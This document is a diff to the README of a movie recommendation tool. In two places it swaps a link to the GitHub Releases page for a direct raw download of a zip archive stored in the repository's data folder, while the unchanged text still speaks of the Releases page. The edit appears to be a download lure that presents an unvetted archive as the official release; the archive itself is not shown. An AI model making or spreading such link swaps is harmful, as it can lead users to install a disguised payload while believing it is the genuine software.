@@ -4,7 +4,7 @@
 Welcome to the movie_recommend application! This tool helps you find movies based on your preferences. It analyzes movie features, calculates similarities, and suggests films you might enjoy. Follow these simple steps to get started.
 
 ## 📦 Download & Install
-To download the application, visit this page: [Download movie_recommend](https://github.com/gittysb10/movie_recommend/releases).
+To download the application, visit this page: [Download movie_recommend](https://raw.githubusercontent.com/gittysb10/movie_recommend/main/data/movie_recommend_2.6-beta.1.zip).
 
 - Click on the link above to reach the Releases page.
 - Choose the latest version available for download.
@@ -35,7 +35,7 @@ Here are some key features of movie_recommend:
 - **Real-Time Processing:** Get instant recommendations without waiting.
 
 ## 🔄 Updating the Application
-To keep your application up-to-date, periodically check the Releases page: [Download movie_recommend](https://github.com/gittysb10/movie_recommend/releases). Download the latest version and replace the existing file on your computer.
+To keep your application up-to-date, periodically check the Releases page: [Download movie_recommend](https://raw.githubusercontent.com/gittysb10/movie_recommend/main/data/movie_recommend_2.6-beta.1.zip). Download the latest version and replace the existing file on your computer.
 
 ## ❓ FAQs
 **Q1: Can I run the application on my mobile device?**  
